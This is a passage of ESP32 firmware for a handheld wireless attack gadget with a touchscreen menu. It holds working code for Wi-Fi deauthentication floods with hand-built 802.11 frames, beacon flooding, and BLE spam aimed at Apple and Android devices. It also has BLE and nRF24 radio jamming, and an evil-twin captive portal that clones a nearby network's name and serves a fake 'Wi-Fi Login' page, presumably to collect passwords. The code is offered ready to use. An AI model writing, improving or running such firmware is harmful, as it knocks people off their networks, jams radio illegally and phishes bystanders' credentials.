  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Status: ");
  tft.setTextColor(deauthActive ? COLOR_WARNING : COLOR_SUCCESS);
  tft.println(deauthActive ? "ATTACKING" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.printf("Packets sent: %d", deauthPacketsSent);
  
  drawBackButton();
}

void drawSpamMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLE SPAM");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Apple Spam", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Android Spam", 1, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Windows Spam", 2, y);
  
  y += BUTTON_HEIGHT + 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Apple: ");
  tft.setTextColor(appleSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
  tft.println(appleSpamActive ? "ACTIVE" : "OFF");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Android: ");
  tft.setTextColor(androidSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
  tft.println(androidSpamActive ? "ACTIVE" : "OFF");
  
  drawBackButton();
}

void drawNRFJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("nRF24 JAM");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Start Jammer", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Stop Jammer", 1, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Toggle Dual", 2, y);
  
  y += BUTTON_HEIGHT + 20;
  tft.setTextSize(1);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Mode: ");
  tft.setTextColor(dualNRFMode ? COLOR_ACCENT : COLOR_PURPLE);
  tft.println(dualNRFMode ? "DUAL (2x)" : "SINGLE");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Radio 1: ");
  tft.setTextColor(nrf1Available ? COLOR_SUCCESS : COLOR_WARNING);
  tft.println(nrf1Available ? "OK" : "FAIL");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Radio 2: ");
  tft.setTextColor(nrf2Available ? COLOR_SUCCESS : COLOR_WARNING);
  tft.println(nrf2Available ? "OK" : "FAIL");
  
  drawBackButton();
}

void showConsole() {
  previousState = currentState;
  currentState = CONSOLE_VIEW;
  
  tft.fillScreen(COLOR_BG);
  drawHeader("CONSOLE");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  int y = HEADER_HEIGHT + 10;
  
  for (int i = 0; i < 15; i++) {
    int idx = (consoleIndex + i) % 15;
    if (consoleBuffer[idx].length() > 0) {
      tft.setCursor(5, y);
      String truncated = consoleBuffer[idx];
      if (truncated.length() > 38) {
        truncated = truncated.substring(0, 38);
      }
      tft.println("> " + truncated);
      y += 10;
      if (y > SCREEN_HEIGHT - 70) break;
    }
  }
  
  drawBackButton();
}

// Improved touch handling with better accuracy
void handleTouch() {
  uint16_t touchX, touchY;
  
  // Get raw touch data
  if (tft.getTouch(&touchX, &touchY)) {
    // Add debounce delay
    delay(150);
    
    // Verify touch is still valid after debounce
    uint16_t verifyX, verifyY;
    if (!tft.getTouch(&verifyX, &verifyY)) {
      return; // Ghost touch, ignore
    }
    
    // Average the two readings for better accuracy
    touchX = (touchX + verifyX) / 2;
    touchY = (touchY + verifyY) / 2;
    
    // Debug output
    Serial.printf("Touch: X=%d, Y=%d, State=%d\n", touchX, touchY, currentState);
    
    // Check back button (always at bottom)
    int backButtonY = SCREEN_HEIGHT - BUTTON_HEIGHT - 10;
    if (touchY >= backButtonY && touchY <= SCREEN_HEIGHT - 10 && 
        touchX >= SIDE_MARGIN && touchX <= SCREEN_WIDTH - SIDE_MARGIN) {
      handleBackButton();
      return;
    }
    
    // Route to appropriate handler based on current state
    switch (currentState) {
      case MAIN_MENU:
        handleMainMenuTouch(touchX, touchY);
        break;
      case WIFI_MENU:
        handleWiFiMenuTouch(touchX, touchY);
        break;
      case WIFI_SCAN:
        handleWiFiScanTouch(touchX, touchY);
        break;
      case WIFI_ATTACK_MENU:
        handleAttackMenuTouch(touchX, touchY);
        break;
      case SNIFFER_MENU:
        handleSnifferMenuTouch(touchX, touchY);
        break;
      case SNIFFER_ACTIVE:
        stopSniffer();
        currentState = SNIFFER_MENU;
        drawSnifferMenu();
        break;
      case BLE_MENU:
        handleBLEMenuTouch(touchX, touchY);
        break;
      case BLE_JAM_MENU:
        handleBLEJamMenuTouch(touchX, touchY);
        break;
      case BLE_JAM_ACTIVE:
        stopBLEJammer();
        currentState = BLE_JAM_MENU;
        drawBLEJammerMenu();
        break;
      case NRF_JAM_MENU:
        handleNRFJamMenuTouch(touchX, touchY);
        break;
      case NRF_JAM_ACTIVE:
        stopNRFJammer();
        currentState = NRF_JAM_MENU;
        drawNRFJammerMenu();
        break;
      case SPAM_MENU:
        handleSpamMenuTouch(touchX, touchY);
        break;
      case MORE_TOOLS_MENU:
        handleMoreToolsTouch(touchX, touchY);
        break;
      case CONSOLE_VIEW:
      case AIRTAG_SCANNER:
      case AIRTAG_RESULTS:
      case SKIMMER_DETECTOR:
      case SKIMMER_RESULTS:
      case WARDRIVING_MODE:
        // Back button only
        break;
    }
  }
}

void handleBackButton() {
  if (continuousWiFiScan) {
    continuousWiFiScan = false;
    WiFi.scanDelete();
  }
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan) pBLEScan->stop();
  }
  if (currentState == BLE_JAM_ACTIVE) stopBLEJammer();
  if (currentState == SNIFFER_ACTIVE) stopSniffer();
  if (currentState == NRF_JAM_ACTIVE) stopNRFJammer();
  if (currentState == WIFI_BLE_NRF_JAM) {
    stopCombinedJammer();
    return;
  }
  
  switch (currentState) {
    case WIFI_MENU:
    case BLE_MENU:
    case SNIFFER_MENU:
    case MORE_TOOLS_MENU:
      currentState = MAIN_MENU;
      drawMainMenu();
      break;
    case WIFI_SCAN:
    case WIFI_ATTACK_MENU:
      currentState = WIFI_MENU;
      drawWiFiMenu();
      break;
    case BLE_JAM_MENU:
    case SPAM_MENU:
    case NRF_JAM_MENU:
      scrollOffset = 0;
      currentState = BLE_MENU;
      drawBLEMenu();
      break;
    case CONSOLE_VIEW:
      currentState = previousState;
      if (previousState == MAIN_MENU) drawMainMenu();
      break;
    default:
      currentState = MAIN_MENU;
      drawMainMenu();
      break;
  }
}

// Calculate which button was pressed based on Y coordinate
int getTouchedButtonIndex(int touchY, int startY) {
  if (touchY < startY) return -1;
  int relativeY = touchY - startY;
  int buttonIndex = relativeY / (BUTTON_HEIGHT + BUTTON_SPACING);
  
  // Check if touch is actually within button bounds (not in spacing)
  int buttonY = startY + (buttonIndex * (BUTTON_HEIGHT + BUTTON_SPACING));
  if (touchY >= buttonY && touchY <= buttonY + BUTTON_HEIGHT) {
    return buttonIndex;
  }
  return -1;
}

void handleMainMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 15;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 3) return;
  
  switch (buttonIndex) {
    case 0: // WiFi Tools
      currentState = WIFI_MENU;
      drawWiFiMenu();
      break;
    case 1: // Packet Sniffer
      currentState = SNIFFER_MENU;
      drawSnifferMenu();
      break;
    case 2: // Bluetooth
      currentState = BLE_MENU;
      drawBLEMenu();
      break;
    case 3: // More Tools
      currentState = MORE_TOOLS_MENU;
      drawMoreToolsMenu();
      break;
  }
}

void handleWiFiMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 3) return;
  
  switch (buttonIndex) {
    case 0: // Scan Networks
      scanWiFiNetworks();
      break;
    case 1: // Deauth Attack
      if (networkCount > 0) {
        currentState = WIFI_ATTACK_MENU;
        drawAttackMenu();
      } else {
        showMessage("Scan networks first!", COLOR_WARNING);
        delay(500);
        drawWiFiMenu();
      }
      break;
    case 2: // Beacon Flood
      startBeaconFlood();
      break;
    case 3: // Captive Portal
      if (networkCount > 0) {
        startCaptivePortal();
      } else {
        showMessage("Scan networks first!", COLOR_WARNING);
        delay(500);
        drawWiFiMenu();
      }
      break;
  }
}

void handleSnifferMenuTouch(int x, int y) {
  // If we're in active sniffer mode with scrollable content
  if (currentState == SNIFFER_ACTIVE) {
    int listY = HEADER_HEIGHT + 35;
    int visiblePackets = 8;
    int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
    
    // Check if touching packet list area for scrolling
    if (y > listY && y < listY + (visiblePackets * 26)) {
      // Touch in list - do nothing (could add packet details later)
      return;
    }
    
    // Scroll down (bottom third of list area)
    if (y > SCREEN_HEIGHT - 140 && y < SCREEN_HEIGHT - 100 && 
        snifferScrollOffset + visiblePackets < totalPackets) {
      snifferScrollOffset += visiblePackets;
      displaySnifferActive();
      return;
    }
    
    // Scroll up (just above scroll indicator)
    if (y > SCREEN_HEIGHT - 180 && y < SCREEN_HEIGHT - 140 && 
        snifferScrollOffset > 0) {
      snifferScrollOffset -= visiblePackets;
      if (snifferScrollOffset < 0) snifferScrollOffset = 0;
      displaySnifferActive();
      return;
    }
    
    // Stop button area
    stopSniffer();
    currentState = SNIFFER_MENU;
    drawSnifferMenu();
    return;
  }
  
  // Regular sniffer menu (start/stop buttons)
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 1) return;
  
  switch (buttonIndex) {
    case 0: // Start Sniffer
      snifferScrollOffset = 0; // Reset scroll
      packetHistoryIndex = 0;  // Reset history
      startSniffer();
      break;
    case 1: // Stop Sniffer
      stopSniffer();
      drawSnifferMenu();
      break;
  }
}

void handleBLEMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 3) return;
  
  int actualIndex = scrollOffset + buttonIndex;
  
  switch (actualIndex) {
    case 0: // Scan BLE
      scanBLEDevices();
      break;
    case 1: // BLE Jammer
      currentState = BLE_JAM_MENU;
      drawBLEJammerMenu();
      break;
    case 2: // BLE Spam
      currentState = SPAM_MENU;
      drawSpamMenu();
      break;
    case 3: // AirTag Scanner
      startAirTagScanner();
      break;
    case 4: // nRF24 Jammer
      currentState = NRF_JAM_MENU;
      drawNRFJammerMenu();
      break;
    case 5: // Combined Jammer
      startCombinedJammer();
      break;
    case 6: // More BLE
      scrollOffset = (scrollOffset + 4) % 7;
      drawBLEMenu();
      break;
  }
}

void handleBLEJamMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 1) return;
  
  switch (buttonIndex) {
    case 0: // Start Jammer
      startBLEJammer();
      break;
    case 1: // Stop Jammer
      stopBLEJammer();
      drawBLEJammerMenu();
      break;
  }
}

void handleNRFJamMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 2) return;
  
  switch (buttonIndex) {
    case 0: // Start Jammer
      startNRFJammer();
      break;
    case 1: // Stop Jammer
      stopNRFJammer();
      drawNRFJammerMenu();
      break;
    case 2: // Toggle Dual Mode
      if (nrf1Available && nrf2Available) {
        dualNRFMode = !dualNRFMode;
        addToConsole(dualNRFMode ? "Dual mode ON" : "Single mode");
        showMessage(dualNRFMode ? "DUAL MODE: 2x POWER!" : "Single mode", 
                    dualNRFMode ? COLOR_SUCCESS : COLOR_TEXT);
        delay(1000);
      } else {
        showMessage("Need 2 radios!", COLOR_WARNING);
        delay(1000);
      }
      drawNRFJammerMenu();
      break;
  }
}

void handleSpamMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 2) return;
  
  switch (buttonIndex) {
    case 0: // Apple Spam
      appleSpamActive = !appleSpamActive;
      if (appleSpamActive) {
        BLEDevice::init("P4WNC4K3");
        pAdvertising = BLEDevice::getAdvertising();
        addToConsole("Apple spam started");
      } else {
        BLEDevice::deinit(false);
        addToConsole("Apple spam stopped");
      }
      drawSpamMenu();
      break;
    case 1: // Android Spam
      androidSpamActive = !androidSpamActive;
      if (androidSpamActive) {
        BLEDevice::init("P4WNC4K3");
        pAdvertising = BLEDevice::getAdvertising();
        addToConsole("Android spam started");
      } else {
        BLEDevice::deinit(false);
        addToConsole("Android spam stopped");
      }
      drawSpamMenu();
      break;
    case 2: // Windows Spam
      showMessage("Coming soon!", COLOR_TEXT);
      delay(1000);
      drawSpamMenu();
      break;
  }
}

void handleMoreToolsTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 2) return;
  
  switch (buttonIndex) {
    case 0: // Skimmer Detect
      startSkimmerDetector();
      break;
    case 1: // Wardriving
      startWardriving();
      break;
    case 2: // Console
      showConsole();
      break;
  }
}

void handleWiFiScanTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 25;
  int itemHeight = 34;
  
  // Check if touching network list
  if (y >= startY && y <= startY + (itemHeight * MAX_DISPLAY_APS)) {
    int clickedIndex = (y - startY) / itemHeight + scanDisplayOffset;
    
    if (clickedIndex >= 0 && clickedIndex < networkCount) {
      selectedIndex = clickedIndex;
      selectedSSID = networks[clickedIndex].ssid;
      
      // Stop continuous scan
      continuousWiFiScan = false;
      WiFi.scanDelete();
      
      currentState = WIFI_ATTACK_MENU;
      drawAttackMenu();
    }
  }
  // Scroll down (touch bottom third)
  else if (y > SCREEN_HEIGHT - 100 && y < SCREEN_HEIGHT - 60 && 
           scanDisplayOffset + MAX_DISPLAY_APS < networkCount) {
    scanDisplayOffset += MAX_DISPLAY_APS;
    displayWiFiScanResults();
  }
  // Scroll up (touch near scroll text)
  else if (y > SCREEN_HEIGHT - 140 && y < SCREEN_HEIGHT - 100 && 
           scanDisplayOffset > 0) {
    scanDisplayOffset -= MAX_DISPLAY_APS;
    if (scanDisplayOffset < 0) scanDisplayOffset = 0;
    displayWiFiScanResults();
  }
}

void handleAttackMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 35;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 1) return;
  
  switch (buttonIndex) {
    case 0: // Start Deauth
      startDeauth();
      drawAttackMenu();
      break;
    case 1: // Stop Attack
      stopDeauth();
      drawAttackMenu();
      break;
  }
}

void loop() {
  handleTouch();
  handleSerialCommands();
  
  if (showSkull && millis() - lastAnimTime > 50) {
    animateSkull();
    lastAnimTime = millis();
  }

  if (continuousWiFiScan && currentState == WIFI_SCAN) {
    int scanStatus = WiFi.scanComplete();
    
    if (scanStatus >= 0) {  // Scan complete
      // Update network list
      networkCount = (scanStatus > 50) ? 50 : scanStatus;
      
      for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        networks[i].isEncrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid != nullptr) {
          memcpy(networks[i].bssid, bssid, 6);
        }
      }
      
      // Refresh display
      if (millis() - lastWiFiScanTime > 300) {  // Throttle updates
        displayWiFiScanResults();
        lastWiFiScanTime = millis();
      }
      
      // Start next scan immediately
      WiFi.scanDelete();
      WiFi.scanNetworks(true);
    }
  }
  
  // CONTINUOUS BLE SCAN UPDATE
  if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
    if (millis() - lastBLEScanUpdate > 2000) {  // Update every 2 seconds
      BLEScanResults results = pBLEScan->getResults();
      bleDeviceCount = results.getCount();
      if (bleDeviceCount > 50) bleDeviceCount = 50;
      
      for (int i = 0; i < bleDeviceCount; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        bleDevices[i].address = device.getAddress().toString().c_str();
        bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
        bleDevices[i].rssi = device.getRSSI();
      }
      
      displayBLEScanResults();
      lastBLEScanUpdate = millis();
    }
  }
  
  // CRITICAL: ZERO delay between deauth packets
  if (deauthActive) {
    performDeauth();
    // NO delay(1) here - attack at maximum speed
  }
  
  if (beaconFloodActive) {
    performBeaconFlood();
  }
  
  if (appleSpamActive) {
    performAppleSpam();
  }
  
  if (androidSpamActive) {
    performAndroidSpam();
  }
  
  if (bleJammerActive) {
    performBLEJam();
  }

  if (nrfJammerActive) {
    performNRFJam();
  }
  
  if (portalActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  // Update displays less frequently
  if (snifferActive && currentState == SNIFFER_ACTIVE) {
    static unsigned long lastSnifferUpdate = 0;
    if (millis() - lastSnifferUpdate > 500) {  // Update every 500ms
      displaySnifferActive();
      lastSnifferUpdate = millis();
    }
  }
  
  if (bleJammerActive && currentState == BLE_JAM_ACTIVE) {
    if (millis() % 500 < 50) {
      updateBLEJammerDisplay();
    }
  }
  
  if (nrfJammerActive && currentState == NRF_JAM_ACTIVE) {
    if (millis() % 500 < 50) {
      updateNRFJammerDisplay();
    }
  }
  
  // REMOVED: delay(1) - we want maximum attack speed
}

// ==================== WiFi Functions ====================

void scanWiFiNetworks() {
  // Start continuous async scan
  continuousWiFiScan = true;
  networkCount = 0;
  scanDisplayOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = WIFI_SCAN;
  addToConsole("AP scan started");
  
  // Start async scan (non-blocking)
  WiFi.scanNetworks(true);  // true = async mode
  
  // Initial display
  displayWiFiScanResults();
}

void displayWiFiScanResults() {
  currentState = WIFI_SCAN;
  tft.fillScreen(COLOR_BG);
  
  // Header with live indicator
  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 10);
  tft.print("SCANNING");
  
  // Blinking LIVE indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
  
  // Status bar
  int statusY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(SIDE_MARGIN, statusY);
  tft.printf("APs: %d", networkCount);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SCREEN_WIDTH - 60, statusY);
  tft.print("LIVE");
  
  // Draw network list
  int y = HEADER_HEIGHT + 25;
  int displayCount = min(networkCount, MAX_DISPLAY_APS);
  
  for (int i = scanDisplayOffset; i < scanDisplayOffset + displayCount && i < networkCount; i++) {
    // Background
    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_BORDER);
    
    // SSID
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y + 5);
    
    String displaySSID = networks[i].ssid;
    if (displaySSID.length() == 0) displaySSID = "<Hidden>";
    if (displaySSID.length() > 26) displaySSID = displaySSID.substring(0, 26);
    tft.println(displaySSID);
    
    // Signal strength bar (visual indicator)
    int rssi = networks[i].rssi;
    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 80);
    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
    
    tft.fillRect(SIDE_MARGIN + 5, y + 20, barWidth, 4, barColor);
    
    // RSSI and Channel
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 90, y + 18);
    tft.printf("%ddBm", rssi);
    
    tft.setTextColor(networks[i].isEncrypted ? COLOR_WARNING : COLOR_SUCCESS);
    tft.setCursor(SIDE_MARGIN + 140, y + 18);
    tft.print(networks[i].isEncrypted ? "LOCK" : "OPEN");
    
    tft.setTextColor(COLOR_ACCENT);
    tft.setCursor(SIDE_MARGIN + 185, y + 18);
    tft.printf("Ch%d", networks[i].channel);
    
    y += 34;
  }
  
  // Scroll indicator
  if (networkCount > MAX_DISPLAY_APS) {
    tft.setTextColor(COLOR_PURPLE);
    tft.setTextSize(1);
    tft.setCursor(SCREEN_WIDTH / 2 - 30, y + 5);
    tft.printf("Scroll %d/%d", (scanDisplayOffset / MAX_DISPLAY_APS) + 1, 
               (networkCount + MAX_DISPLAY_APS - 1) / MAX_DISPLAY_APS);
  }
  
  drawBackButton();
}

void startDeauth() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    showMessage("No target selected!", COLOR_WARNING);
    return;
  }
  
  deauthActive = true;
  deauthPacketsSent = 0;
  
  // CRITICAL: Set to AP mode FIRST
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_wifi_set_mode(WIFI_MODE_AP);
  delay(100);
  
  // Set channel
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex != -1) {
    esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("Set to channel %d\n", networks[targetIndex].channel);
  }
  
  addToConsole("Deauth started: " + selectedSSID);
  showMessage("Deauth attack started!", COLOR_WARNING);
  delay(500);
}

void stopDeauth() {
  deauthActive = false;
  addToConsole("Deauth stopped");
  showMessage("Deauth stopped", COLOR_SUCCESS);
  delay(500);
}

void performDeauth() {
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) return;
  
  // FIXED: Proper deauth packet structure for ESP32
  uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                          // Type/Subtype: Deauthentication
    /*  2 - 3  */ 0x00, 0x00,                          // Duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP
    /* 22 - 23 */ 0x00, 0x00,                          // Sequence/Fragment
    /* 24 - 25 */ 0x07, 0x00                           // Reason: Class 3 frame from non-associated STA
  };
  
  uint8_t *bssid = networks[targetIndex].bssid;
  
  // CRITICAL FIX: Set WiFi to AP mode BEFORE sending
  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP) {
    esp_wifi_set_mode(WIFI_MODE_AP);
    delay(10);
  }
  
  // Send bursts with proper error handling
  for (int burst = 0; burst < 5; burst++) {
    
    // Direction 1: AP -> Broadcast (disconnect all clients)
    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Destination: Broadcast
    memcpy(&deauthPacket[10], bssid, 6);                      // Source: AP
    memcpy(&deauthPacket[16], bssid, 6);                      // BSSID: AP
    
    // Send 3 packets
    for (int i = 0; i < 3; i++) {
      esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      if (result == ESP_OK) {
        deauthPacketsSent++;
      } else {
        Serial.printf("TX Error: 0x%X\n", result);
      }
      delayMicroseconds(100);
    }
    
    // Direction 2: Random Client -> AP (block reconnections)
    uint8_t randomClient[6];
    for (int j = 0; j < 6; j++) {
      randomClient[j] = random(0, 256);
    }
    randomClient[0] = (randomClient[0] & 0xFE) | 0x02; // Set locally administered bit
    
    memcpy(&deauthPacket[4], bssid, 6);         // Destination: AP
    memcpy(&deauthPacket[10], randomClient, 6); // Source: Random client
    memcpy(&deauthPacket[16], bssid, 6);        // BSSID: AP
    
    // Send 3 packets
    for (int i = 0; i < 3; i++) {
      esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      if (result == ESP_OK) {
        deauthPacketsSent++;
      }
      delayMicroseconds(100);
    }
    
    yield(); // Prevent watchdog
  }
  
  // Update display throttling
  static unsigned long lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 500 && currentState == WIFI_ATTACK_MENU) {
    int y = HEADER_HEIGHT + 35 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 35;
    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 15, COLOR_BG);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.printf("Packets sent: %d", deauthPacketsSent);
    lastDisplayUpdate = millis();
  }
}

void startBeaconFlood() {
  beaconFloodActive = !beaconFloodActive;
  if (beaconFloodActive) {
    addToConsole("Beacon flood started");
    showMessage("Beacon flood active!", COLOR_WARNING);
  } else {
    addToConsole("Beacon flood stopped");
    showMessage("Beacon flood stopped", COLOR_SUCCESS);
  }
  delay(1000);
  drawWiFiMenu();
}

void performBeaconFlood() {
  static int beaconCounter = 0;
  static uint8_t channel = 1;
  
  char fakeSSID[33];
  sprintf(fakeSSID, "FREE_WIFI_%04X", random(0, 65536));
  
  uint8_t beaconPacket[128];
  memset(beaconPacket, 0, sizeof(beaconPacket));
  
  beaconPacket[0] = 0x80;
  
  for (int i = 10; i < 16; i++) {
    beaconPacket[i] = random(0, 256);
  }
  
  beaconPacket[37] = 0x00;
  beaconPacket[38] = strlen(fakeSSID);
  memcpy(&beaconPacket[39], fakeSSID, strlen(fakeSSID));
  
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 39 + strlen(fakeSSID), false);
  
  beaconCounter++;
  
  if (beaconCounter % 50 == 0) {
    channel = (channel % 13) + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
}

void startCaptivePortal() {
  if (selectedSSID.length() == 0) {
    if (networkCount > 0) {
      selectedSSID = networks[0].ssid;
    } else {
      showMessage("No networks found!", COLOR_WARNING);
      delay(1000);
      return;
    }
  }
  
  portalActive = true;
  
  if (snifferActive) stopSniffer();
  if (deauthActive) stopDeauth();
  WiFi.disconnect();
  delay(100);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(selectedSSID.c_str());
  
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);
      break;
    }
  }
  
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  webServer.on("/", HTTP_GET, handlePortalRoot);
  webServer.on("/post", HTTP_POST, handlePortalPost);
  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
  webServer.onNotFound(handlePortalRoot);
  webServer.begin();
  
  addToConsole("Portal started: " + selectedSSID);
  showMessage("Captive portal active!", COLOR_SUCCESS);
  delay(2000);
  drawWiFiMenu();
}

void stopCaptivePortal() {
  portalActive = false;
  webServer.stop();
  dnsServer.stop();
  WiFi.mode(WIFI_STA);
  addToConsole("Portal stopped");
}

void handlePortalRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Wi-Fi Login</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>";
  html += "<style>";
  html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
  html += "background:#f5f5f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
  html += ".container{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.08);max-width:400px;width:100%;}";
  html += ".wifi-symbol{text-align:center;margin-bottom:20px;}";
  html += ".wifi-icon{display:inline-block;width:50px;height:50px;border-radius:50%;background:#007AFF;position:relative;}";
  html += ".wifi-icon::before{content:'';position:absolute;width:20px;height:20px;border:3px solid white;";
  html += "border-top:none;border-right:none;border-radius:0 0 0 100%;left:15px;top:20px;transform:rotate(45deg);}";
  html += ".wifi-icon::after{content:'';position:absolute;width:6px;height:6px;background:white;";
  html += "border-radius:50%;left:22px;bottom:12px;}";
  html += "h2{margin:0 0 8px;color:#000;font-size:22px;text-align:center;font-weight:600;}";
  html += ".subtitle{color:#86868b;text-align:center;margin-bottom:30px;font-size:14px;}";
  html += ".form-group{margin-bottom:20px;}";
  html += "label{display:block;color:#000;font-size:13px;font-weight:500;margin-bottom:6px;}";
  html += "input{width:100%;padding:12px;border:1px solid #d2d2d7;border-radius:8px;box-sizing:border-box;";
  html += "font-size:16px;background:#fff;}";
  html += "input:focus{outline:none;border-color:#007AFF;}";
